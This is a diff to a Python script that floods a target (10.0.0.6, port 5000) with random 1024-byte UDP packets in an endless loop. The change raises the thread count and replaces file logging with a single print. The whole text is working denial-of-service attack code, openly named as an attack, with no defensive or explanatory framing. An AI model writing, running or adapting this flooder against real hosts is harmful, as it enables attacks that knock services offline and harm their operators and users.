@@ -10,28 +10,26 @@ from locale import str
 # port = int(80)/
 
 ip = "10.0.0.6"
-port = 80
+port = 5000
 choice = "UDP"
-times = 5
-threads = 1
+times = 1
+threads = 10
 
 
 def floodUDP():
-    j = True
     data = random._urandom(1024)
-    i = random.choice(("[*]", "[!]", "[#]"))
+    j = True
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             address = (ip, port)
             for x in range(times):
                 s.sendto(data, address)
-                file_txt = open("attack_output.txt", 'a')
-                file_txt.writelines(i)
-                file_txt.writelines(" packets sent")
-                file_txt.writelines("\n")
-        except:
-            print("Error")
+                if j == True:
+                    print("Sent packets.")
+                    j = False
+        except Exception as e:
+            print(e)
             break
 
 
